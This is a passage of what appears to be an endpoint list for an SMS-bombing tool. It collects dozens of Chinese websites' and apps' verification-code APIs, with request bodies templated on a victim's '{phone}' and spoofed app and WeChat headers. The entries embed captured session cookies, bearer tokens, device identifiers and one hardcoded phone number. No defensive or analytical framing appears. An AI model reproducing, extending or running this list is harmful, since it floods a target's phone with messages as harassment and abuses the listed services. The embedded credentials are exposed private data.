    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i",
    "Cookie": "PHPSESSID=kqlt8pvalt0k9t02sjahlg0ir0; 13524501748=38ad4cbcf2ded5f78da09b100b0191dc"
  }
},
{
  "name": "ymzp.0633hr.com",
  "url": "https://ymzp.0633hr.com/mobile/insurance/send_code",
  "method": "POST",
  "data": {
    "user_login": f"{phone}",
    "sms_token": "SMS640a23ac0243702f55bdb031db2b9bd7"
  },
  "headers": {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "sec-ch-ua-platform": "\"Android\"",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
    "sec-ch-ua-mobile": "?0",
    "origin": "https://ymzp.0633hr.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://ymzp.0633hr.com/mobile/insurance/buy_insure?id=13",
    "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=1, i",
    "Cookie": "PHPSESSID=kqlt8pvalt0k9t02sjahlg0ir0; 13524501748=38ad4cbcf2ded5f78da09b100b0191dc"
  }
},
{
  "name": "suzhaohuo.com",
  "url": "https://www.suzhaohuo.com/xcx/act/registerGetSms",
  "method": "POST",
  "params": {
    "site": ""
  },
  "json_data": {
    "mobile": f"{phone}",
    "act": "register",
    "yzm": "5912",
    "pushid": ""
  },
  "headers": {
    "Content-Type": "application/json",
    "authorization": "Bearer ",
    "clientid": "7f0000010ce40002c987",
    "cid": "",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wxa4b71da089fe36f9/41/page-frame.html"
  }
},
{
  "name": "gig-c-api.1haozc.com",
  "url": "https://gig-c-api.1haozc.com/api/v2/auth/sendSmsCode",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}",
    "codeType": 1
  },
  "headers": {
    "Content-Type": "application/json",
    "version_name": "3.0.1",
    "params": "{\"_appid\":\"cpid\",\"_rk\":\"9B47E841-924B-4E03-8384-A43A4D8C8B4B\",\"_ts\":\"20251002055057\",\"_v\":\"1.0\",\"_sign\":\"bffc13fb4f728518a3deb0d35c12792d\"}",
    "content-type": "application/json;charset=utf-8",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx8f3fac1aef79d998/73/page-frame.html"
  }
},
{
  "name": "ygh2024-api.yougehuo.net",
  "url": "https://ygh2024-api.yougehuo.net/send_code",
  "method": "POST",
  "json_data": {
    "phoneNum": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "token": "CCUiT9YAd3A7LivBXBzN4lFz2nWObgnXA",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx0bac6fbc74326495/101/page-frame.html"
  }
},
{
  "name": "wxapi.diyibox.com",
  "url": "https://wxapi.diyibox.com/api/User/VerificationCodeApp",
  "method": "POST",
  "json_data": {
    "Mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx2951257ad586966f/28/page-frame.html"
  }
},
{
  "name": "xwtmer2022.dq.cn",
  "url": "https://xwtmer2022.dq.cn/retrieve/commonSendVerifyCode",
  "method": "POST",
  "json_data": {
    "BusinessCode": "100",
    "CommunicValue": f"{phone}",
    "globalRoamingCode": "+86"
  },
  "headers": {
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
    "content-type": "application/json; charset=UTF-8",
    "platformsessionid": "platsession:2025:10:3:fd377510-a085-11f0-b86d-495f255752e6-5bca3aa5-094c-432d-800e-5197df24528b",
    "platform": "102",
    "platformhost": "xwtmer2022.dq.cn",
    "platformreferer": "https://xwtmer2022.dq.cn",
    "device": "10002",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx85e251c7db92c7dc/22/page-frame.html"
  }
},
{
  "name": "api.lanniao.com",
  "url": "https://api.lanniao.com/agencyApi/sms/sendIndetifySms/{phone}",
  "method": "GET",
  "headers": {
    "content-type": "application/json",
    "app-name": "agencyApplet",
    "referer-current": "pages/UserCenter/index",
    "referer-prev": "applet",
    "app-version": "linggong",
    "app-id": "wx29623ae9f3223741",
    "pay-version": "Y",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx29623ae9f3223741/23/page-frame.html"
  }
},
{
  "name": "xuexi.wacai.com",
  "url": "https://xuexi.wacai.com/edu-app/api/user/sms-send",
  "method": "POST",
  "json_data": {
    "mob": f"{phone}"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "x-access-token": "",
    "x-mc": "00000001",
    "x-platform": "226",
    "x-appver": "1.0.16"
  }
},
{
  "name": "api.livelab.com.cn",
  "url": "https://api.livelab.com.cn/thirdParty/sms/app/captcha",
  "method": "POST",
  "data": {
    "phone": f"{phone}",
    "type": "1"
  },
  "headers": {
    "Accept-Encoding": "gzip",
    "platform-type": "android",
    "x-fwd-anonymousid": "ae9b5df9da406ccb",
    "platform-version": "3.20.0"
  }
},
{
  "name": "api.lanniao.com",
  "url": "https://api.lanniao.com/agencyApi/sms/sendIndetifySms/{phone}",
  "method": "GET",
  "headers": {
    "content-type": "application/json",
    "app-name": "agencyApplet",
    "referer-current": "pages/UserCenter/index",
    "referer-prev": "applet",
    "app-version": "linggong",
    "app-id": "wx29623ae9f3223741",
    "pay-version": "Y",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx29623ae9f3223741/23/page-frame.html"
  }
},
{
  "name": "fwapi.lingyonggong.cn",
  "url": "https://fwapi.lingyonggong.cn/v1/sms/unauth_codes",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcm4iOiIyIiwiZXhwIjoxNzU5OTQ4NDIyLCJwbGF0Zm9ybV9pZCI6IjIiLCJ1c2VyX2lkIjoiIiwidXNlcl9uYW1lIjoiIiwid3hfYXBwaWQiOiJ3eDg1NjJhYzlmMmMxNjRlMTUiLCJ3eF9vcGVuaWQiOiJvc3VvWDQyZWM4QUNybXhyMEZZSDhmeUVYSWVnIn0.S3tx-_7khwISds6FmqJ1Ltq692TIZU-AepvspDj7RC8",
    "charset": "utf-8",
    "referer": "https://servicewechat.com/wx8562ac9f2c164e15/17/page-frame.html"
  }
},
{
  "name": "gengyunhr.com",
  "url": "https://www.gengyunhr.com/api/wechat/auth/sendVerificationCodeFront",
  "method": "GET",
  "params": {
    "phone": f"{phone}",
    "type": "1"
  },
  "headers": {
    "Token": "",
    "content-type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx4db37b16d46940dc/169/page-frame.html"
  }
},
{
  "name": "hnzy.shiqiao.com",
  "url": "https://hnzy.shiqiao.com/api/pashanhu/v1/VerificateCodes/GetVerificateCode",
  "method": "POST",
  "json_data": {
    "mobile": f"{phone}"
  },
  "headers": {
    "Content-Type": "application/json",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx89ec7ffce6e71081/44/page-frame.html"
  }
},
{
  "name": "jgsw.hainan.gov.cn",
  "url": "https://jgsw.hainan.gov.cn/gcyhpt/api/auth/sendSmsCode",
  "method": "GET",
  "params": {
    "mobile": f"{phone}",
    "systemType": "front"
  },
  "headers": {
    "content-type": "application/json",
    "Access-Control-Allow-Origin": "*",
    "channelType": "4",
    "Authorization": "",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx74a58dfd2d8c5356/64/page-frame.html",
    "Cookie": "HttpOnly=true"
  }
},
{
  "name": "jgsw.hainan.gov.cn",
  "url": "https://jgsw.hainan.gov.cn/gcyhpt/api/auth/sendSmsCode",
  "method": "GET",
  "params": {
    "mobile": f"{phone}",
    "systemType": "front"
  },
  "headers": {
    "content-type": "application/json",
    "Access-Control-Allow-Origin": "*",
    "channelType": "4",
    "Authorization": "",
    "charset": "utf-8",
    "Referer": "https://servicewechat.com/wx74a58dfd2d8c5356/64/page-frame.html",
    "Cookie": "HttpOnly=true"
  }
},
{
  "name": "usercenter.leshuazf.com",
  "url": "https://usercenter.leshuazf.com/usercenter/v2/openapi/sendVecode",
  "method": "POST",
  "json_data": {
    "address": f"{phone}",
    "addressType": 2,
    "vecodeType": 1
  },
  "headers": {
    "Content-Type": "application/json",
    "X-Source": "bussLine=PAYBU_JH;appType=10132;deviceId=6f668ce76e874c7d87f25597d406d37a;appVer=268001;sdkVer=2.0.1;platform=android"
  }
},
{
  "name": "usercenter.leshuazf.com",
  "url": "https://usercenter.leshuazf.com/usercenter/v2/openapi/sendVecode",
  "method": "POST",
  "json_data": {
    "address": f"{phone}",
    "addressType": 2,
    "vecodeType": 1
  },
  "headers": {
    "Content-Type": "application/json",
    "X-Source": "bussLine=PAYBU_POS;appType=10081;deviceId=d9510b6a-78da-48d6-8eba-044a06ae1a72;appVer=192001;sdkVer=2.0.1;platform=android"
  }
},
{
  "name": "open.gdyfsk.com",
  "url": "https://open.gdyfsk.com/mini/v5/sbapi/login/sms",
  "method": "GET",
  "params": {
    "phone": f"{phone}"
  },
  "headers": {
    "User-Agent": "Dart/3.7 (dart:io)",
    "Accept-Encoding": "gzip",
    "Cookie": "acw_tc=0a03334217609747652374472e192583c0ff9c1c1e740b7be3dd72f6575da8"
  }
},
{
  "name": "tcbff.xiaoguaijizhang.cn",
  "url": "https://tcbff.xiaoguaijizhang.cn/v1/account/login",
  "method": "POST",
  "params": {
    "phone": f"{phone}"
  },
  "headers": {
    "User-Agent": "Dart/3.6 (dart:io)",
    "Accept-Encoding": "gzip",
    "did": "",
    "appversion": "3.1.6",
    "content-length": "0",
    "channel": "oppo",
    "authorization": "",
    "clienttype": "android",
    "localelanguage": "zh"
  }
},
{
  "name": "118.126.93.51",
  "url": "https://118.126.93.51:9010/getVerifyCode",
  "method": "POST",
  "data": "\n\u000b{{phone}}\u0010",
  "headers": {
    "Host": "118.126.93.51:9010",
    "User-Agent": "okhttp/3.12.6",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream"
  }
},
{
  "name": "api.bill.youqian.pro",
  "url": "https://api.bill.youqian.pro/user/code/sms",
  "method": "POST",
  "params": {
    "mobile": f"{phone}"
  },
  "headers": {
    "User-Agent": "Dart/3.3 (dart:io)",
    "Accept-Encoding": "gzip",
    "sv": "15",
    "sys": "android",
    "appversion": "4.5.1",
    "content-length": "0",
    "appbn": "4787",
    "content-type": "application/json"
  }
},
{
  "name": "jz.ttjizhang.com",
  "url": "http://jz.ttjizhang.com/api/v3/userCenter/sms/sendCode",
  "method": "POST",
  "json_data": {
    "appVersion": "5.1.3",
    "appName": "com.ttjz",
    "osType": "2",
    "isource": "12021",
    "smsType": "24",
    "mobileNo": f"{phone}",
    "deviceId": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "appChannel": "OPPO"
  },
  "headers": {
    "User-Agent": "okhttp/4.9.0",
    "Connection": "close",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "appVersion": "5.1.3",
    "version": "5.1.3",
    "name": "com.ttjz",
    "osType": "2",
    "flavor": "seczb",
    "releaseVersion": "5.1.3",
    "source": "12021",
    "cuserId": "39dc5cc6-82a6-4e74-83eb-6f8628151088",
    "token": "",
    "devType": "com.ttjzOPPO",
    "appPkgName": "com.ttjz",
    "appVersionName": "5.1.3",
    "appVersionCode": "220",
    "product": "%E8%AE%B0%E8%B4%A6%E5%B0%8F%E8%B4%A6",
    "device": "OnePlusOPD2404",
    "channel": "OPPO",
    "deviceId": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "Content-Type": "application/json; charset=utf-8"
  }
},
{
  "name": "wm.yuluojishu.com",
  "url": "https://wm.yuluojishu.com/api.captcha/getCaptcha",
  "method": "POST",
  "data": {
    "phone": f"{phone}",
    "type": "1",
    "channel": "zwyqjjcs_oppo"
  },
  "headers": {
    "User-Agent": "okhttp/3.14.9",
    "Accept-Encoding": "gzip",
    "token": ""
  }
},
{
  "name": "cw-api.julanling.com",
  "url": "https://cw-api.julanling.com/app/login/sendVerifyCode",
  "method": "POST",
  "json_data": {
    "androidID": "0f11cb06a99e9fa1",
    "androidOaid": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "appActivateDate": "2025-10-20 23:22:15",
    "appChannel": "OPPO",
    "appPackage": "com.julanling.gdjgjz",
    "appVersion": "1.2.40",
    "brand": "OnePlus",
    "cid_um": "AvxUAYp9YPatTFEjYOGd_oZwiJFYH2-2UCSszeECFH2h",
    "deviceId": "0f11cb06a99e9fa1",
    "deviceToken": "88abf282a46304cd7cca920dd9154bca",
    "deviceUniqueCode": "88abf282a46304cd7cca920dd9154bca",
    "manufacturer": "OnePlus",
    "mobile": f"{phone}",
    "model": "OPD2404",
    "operatingSystem": "ANDROID",
    "operationSystem": "ANDROID",
    "osVersion": "35",
    "scene": "VERIFY_CODE_LOGIN",
    "sdkVersion": "35"
  },
  "headers": {
    "User-Agent": "Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.58 Safari/537.36 HxAxClientCmWebKit/1.2.40 (hxAx_App;1240;com.julanling.gdjgjz;OPPO;ANDROID;hxAx_ToolMatrix)",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "apppackage": "com.julanling.gdjgjz",
    "appversion": "1.2.40",
    "platformcontainer": "APP",
    "platformtype": "APP",
    "operatingsystem": "ANDROID",
    "deviceid": "0f11cb06a99e9fa1",
    "appactivatedate": "2025-10-20 23:22:15",
    "manufacturer": "OnePlus",
    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzeXN0ZW1Tb3VyY2UiOiJHREpHIiwiaXNHdWVzdCI6InRydWUiLCJpYXQiOjE3NjEwMzM3NTcsImdkamdBeFVpZCI6IjIwNzU0NTE1MSJ9.LE9F4DzvkdwPV-xXeAa34VLcaDCxnbVaG36XI3aiIEKltuIT2D5TZmwOQwSc6IWGssMElKRjHgCionsv52TA-7brlawU982oJaT5mokXCv0m0Hpo2GvWcerNC1U3wzbk7X-Jmu-FGM1hUhQf_9b2HjCIlEhW_ijFQLUO3wBOf7M",
    "devicetokenoaid": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "osversion": "35",
    "operatesystem": "ANDROID",
    "platformversion": "15",
    "deviceuniquecode": "88abf282a46304cd7cca920dd9154bca",
    "model": "OPD2404",
    "brand": "OnePlus",
    "cid_um": "AvxUAYp9YPatTFEjYOGd_oZwiJFYH2-2UCSszeECFH2h",
    "androidoaid": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "appchannel": "OPPO",
    "devicetoken": "0f11cb06a99e9fa1",
    "sdkversion": "35",
    "accept-language": "zh-CN,zh;q=0.8",
    "operationsystem": "ANDROID",
    "androidid": "0f11cb06a99e9fa1",
    "cid": "",
    "ptt": "m314",
    "content-type": "application/json;charset=utf-8"
  }
},
{
  "name": "wm.yuluojishu.com",
  "url": "https://wm.yuluojishu.com/api.captcha/getCaptcha",
  "method": "POST",
  "data": {
    "phone": f"{phone}",
    "type": "1",
    "channel": "yqjjcs_oppo"
  },
  "headers": {
    "User-Agent": "okhttp/3.14.9",
    "Accept-Encoding": "gzip",
    "token": "",
    "Cookie": "PHPSESSID=91c47a634e907417d3b32b31c422c487"
  }
},
{
  "name": "aa.bestrie.com",
  "url": "https://aa.bestrie.com/api/passport/user/verifycode",
  "method": "POST",
  "data": {
    "phone": f"{phone}"
  },
  "headers": {
    "User-Agent": "Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.58 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/32.0)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "token": "",
    "Cookie": "JSESSIONID=09D0F0CBBB98A553F3DB11BA76C2ECDB"
  }
},
{
  "name": "gold-hub.jinzanzan.com",
  "url": "https://gold-hub.jinzanzan.com/api/auth/send-code",
  "method": "POST",
  "json_data": {
    "phoneNumber": f"{phone}"
  },
  "headers": {
    "User-Agent": "Dart/3.4 (dart:io)",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "client-platform": "android",
    "client-type": "app",
    "x-timestamp": "1761040236",
    "app-version": "1.16.0",
    "x-timestamp-signature": "1d5a0ff8603544adf8b1463cae695091fb406ec29670cc4cdb1d0225e62ba512"
  }
},
{
  "name": "hebao.pipimiaomiao.top",
  "url": "https://hebao.pipimiaomiao.top/sms/login/send",
  "method": "POST",
  "params": {
    "brand": "OnePlus",
    "model": "OPD2404",
    "from": "oppo",
    "deviceid": "c6bf97f08e690f29",
    "os": "android",
    "osv": "35",
    "appv": "2.7.0",
    "appc": "200700000",
    "aid": "c6bf97f08e690f29",
    "sw": "2120",
    "sh": "3000",
    "packageName": "com.ppmm.hebao",
    "locale": "zh_Hans_CN",
    "account_country_code": "CN"
  },
  "json_data": {
    "to": "+86{{phone}}"
  },
  "headers": {
    "User-Agent": "Dart/3.5 (dart:io)",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "aesenable": "NO"
  }
},
{
  "name": "yzx.guoguoenglish.com",
  "url": "https://yzx.guoguoenglish.com/api/yzx/captcha/getCaptcha",
  "method": "POST",
  "json_data": {
    "app_bundle_label": "yqb_oppo",
    "pkg": "com.cqfl.yqb",
    "channel": "yqb_oppo",
    "phone": f"{phone}",
    "type": "1",
    "token": ""
  },
  "headers": {
    "Accept": "application/x-www-form-urlencoded",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "appversion": "1.2.3"
  }
},
{
  "name": "cs.snmi.cn",
  "url": "https://cs.snmi.cn/user/GetVCode",
  "method": "POST",
  "data": {
    "pkgName": "com.snmi.ddsbkq.overtimerecord",
    "Mobile": f"{phone}"
  },
  "headers": {
    "User-Agent": "okhttp/3.3.0",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "106.54.2.168",
  "url": "http://106.54.2.168/smallChargeUmps/verification/sendPhone",
  "method": "POST",
  "json_data": {
    "phoneNumber": f"{phone}"
  },
  "headers": {
    "User-Agent": "okhttp/3.14.9",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "Accept-Language": "zh",
    "isChina": "1",
    "SystemType": "2",
    "token": "",
    "Content-Type": "application/json; charset=UTF-8",
    "Cookie": "SSO-SESSIONID=763949C7D99156A08963E8E2817103FD"
  }
},
{
  "name": "jizhang.qixinginc.com",
  "url": "http://jizhang.qixinginc.com/api/user/send_sms_verify_code/",
  "method": "POST",
  "data": {
    "phone_num": f"{phone}",
    "v": "5001000"
  },
  "headers": {
    "User-Agent": "okhttp/4.9.1",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
  }
},
{
  "name": "tar.adooe.com",
  "url": "https://tar.adooe.com/api20/sms/code",
  "method": "POST",
  "data": {
    "mobile": f"{phone}",
    "type": "1001"
  },
  "headers": {
    "User-Agent": "Dart/2.17 (dart:io)",
    "Accept-Encoding": "gzip",
    "source": "target_apps",
    "x-requested-with": "XMLHttpRequest",
    "v": "1.2.34",
    "checksum": "79f0a2bb68974fbec71a6422bef34cf4",
    "curtime": "1761045938348",
    "nonce": "1"
  }
},
{
  "name": "guai.taxiangapp.com",
  "url": "https://guai.taxiangapp.com/userauth/v1/account/sendPhoneLoginCode",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}"
  },
  "headers": {
    "User-Agent": "Dart/3.9 (dart:io)",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "appversion": "1.2.4",
    "channel": "oppo",
    "authorization": "",
    "adid": "4b53dda48eaf8fbb",
    "umid": "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
    "clienttype": "android"
  }
},
{
  "name": "law.lejianyou.com",
  "url": "https://law.lejianyou.com/api/yzx/captcha/getCaptcha",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}",
    "type": 1,
    "oaid": "",
    "app_bundle_label": "gdjdjf_oppo",
    "channel": "oppo",
    "version": "1.2.0",
    "pkg": "com.fx.gdjdjf",
    "imei": "",
    "token": "",
    "idfa": ""
  },
  "headers": {
    "User-Agent": "Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.58 Safari/537.36 uni-app (Immersed/32.0)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "appVersion": "1.2.0",
    "Content-Type": "application/json;charset=UTF-8"
  }
},
{
  "name": "v11.bee.deepgames.fun",
  "url": "https://v11.bee.deepgames.fun//v2/sms/mobile.register",
  "method": "POST",
  "data": {
    "mobile": f"{phone}",
    "version": "3.3.0",
    "version_code": "1",
    "channel": "oppo"
  },
  "headers": {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 15; OPD2404 Build/UKQ1.231108.001)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "identity",
    "Cookie": "session_id=b867e7235496e40b2147d981c2680a91; PHPSESSID=b867e7235496e40b2147d981c2680a91"
  }
},
{
  "name": "xiaoguo.smallnut.com",
  "url": "https://xiaoguo.smallnut.com/api/product/tally/account-member/sendSms",
  "method": "POST",
  "json_data": {
    "phone": f"{phone}"
  },
  "headers": {
    "User-Agent": "Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.58 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/32.0)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "Authorization": ""
  }
},
{
  "name": "api-book.kaying.cc",
  "url": "https://api-book.kaying.cc/anno/mobile/sendCode",
  "method": "GET",
  "params": {
    "mobile": f"{phone}"
  },
  "headers": {
    "User-Agent": "Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.58 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/32.0)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json;charset=utf-8",
    "token": "Bearer"
  }
},
{
    "name": "zhwt100.cn",
    "url": "http://www.zhwt100.cn/wechat/loginp/sms.do",
    "method": "POST",
    "data": {
      "cellphone": f"{phone}"
    },
    "headers": {
      "Connection": "Keep-Alive",
      "Accept-Encoding": "gzip"
    }
  },
  {
    "name": "account.iorest.com",
    "url": "https://account.iorest.com/api/vcode/send",
    "method": "POST",
    "json_data": {
      "phone": f"{phone}",
      "action": 1
    },
    "headers": {
      "Accept-Encoding": "gzip",
      "Content-Type": "application/json"
    }
  },
  {
    "name": "billcat.cn",
    "url": "https://billcat.cn/api/app/send_sms_code",
    "method": "POST",
    "json_data": {
      "phone": f"{phone}"
    },
    "headers": {
      "Accept-Encoding": "gzip",
      "Content-Type": "application/json",
      "client-type": "android",
      "authorization": "Bearer",
      "app-version": "3.2.4"
    }
  },
  {
    "name": "c.dtinsure.com",
    "url": "https://c.dtinsure.com/gateway/kbc-ccs-dc/api/noauth/sms/send",
    "method": "POST",
    "json_data": {
      "phoneNumber": f"{phone}",
      "smsType": "login"
    },
    "headers": {
      "Accept": "application/json, text/plain, */*",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Content-Type": "application/json;charset=UTF-8",
      "osName": "oneplus",
      "Authorization": "",
      "sec-ch-ua-platform": "\"Android\"",
      "tenantId": "T0001",
      "osVersion": "35",
      "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
      "sec-ch-ua-mobile": "?0",
      "deviceType": "1",
      "imei": "d94683977bd66555",
      "appVersion": "1.0.9",
      "fromId": "",
      "appCode": "ccsDcApp",
      "Origin": "https://c.dtinsure.com",
      "X-Requested-With": "com.DaTong.HousekeeperForAndroid",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://c.dtinsure.com/ccs/smsLogin?redirectUrl=",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
      "Cookie": "__jsluid_s=e364182ab55859a80d87494675780e8a; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219a0801759519e-060382fc231dd94-6f456f21-923544-19a08017597275%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTlhMDgwMTc1OTUxOWUtMDYwMzgyZmMyMzFkZDk0LTZmNDU2ZjIxLTkyMzU0NC0xOWEwODAxNzU5NzI3NSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D"
    }
  },
{
    "name": "zyoushu.com",
    "url": "https://www.zyoushu.com/zyoushuapp/app/index/ajax/random/mobile/register",
    "method": "POST",
    "data": {
      "mobile": f"{phone}",
      "randomCode_image": "2260"
    },
    "headers": {
      "Accept": "application/json, text/plain, */*",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "sec-ch-ua-platform": "\"Android\"",
      "CLIENT_VERSION": "1",
      "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
      "sec-ch-ua-mobile": "?0",
      "subjectId": "10c0ddfd852f49ee9b70c04ec74a8ae6",
      "Origin": "https://localhost",
      "X-Requested-With": "com.zyoushu.zyoushuapp",
      "Sec-Fetch-Site": "cross-site",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://localhost/",
      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
      "Cookie": "JSESSIONID=67B2525E7231E9418A1DD1A63CDB5DDA"
    }
  },
  {
    "name": "lm.center.sanwubeixin.cn",
    "url": "https://lm.center.sanwubeixin.cn/login/captcha?tel=16725803690",
    "method": "GET",
    "headers": {
      "Accept-Encoding": "gzip",
      "uid": "154495566",
      "os": "1",
      "money": "0",
      "param": "{\"imei\":\"\",\"android_id\":\"\",\"mac\":\"\",\"oaid\":\"0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45\",\"packet_name\":\"com.tm.appbill\"}",
      "packet": "oppo",
      "app_id": "795",
      "version": "3.1",
      "is_trial": "0"
    }
  },
  {
    "name": "bill.incmoon.com",
    "url": "https://bill.incmoon.com/jiZhangBa/account/mobile/captcha",
    "method": "POST",
    "json_data": {
      "mobile": f"{phone}"
    },
    "headers": {
      "Connection": "Keep-Alive",
      "Accept": "application/json",
      "Accept-Encoding": "gzip",
      "Content-Type": "application/json",
      "Accept-Charset": "UTF-8",
      "Grape": "baac0f2b5a0db850d1bc31d90102fb11",
      "timeStamp": "1761119410469",
      "Jwt": "",
      "Token": "",
      "AppProject": "JiZhangBa",
      "AppEnvironment": "production",
      "AppPlatform": "Android",
      "AppChannel": "huawei",
      "AppVersion": "2.3.0",
      "AppVersionCode": "230",
      "ApiVersion": "1.0",
      "DeviceId": "2e31f41daea1e3809adeffe2444caa84c",
      "DeviceChannel": "oppo",
      "PushToken": "OnePlus_CN_d1640fef5b24fce886a2e6530f1f25c0"
    }
  },
  {
    "name": "bill.szcyqg.com",
    "url": "https://bill.szcyqg.com/app-api/auth/sendMessage",
    "method": "POST",
    "json_data": {
      "mobile": f"{phone}",
      "scene": "1"
    },
    "headers": {
      "Accept-Encoding": "gzip",
      "Content-Type": "application/json",
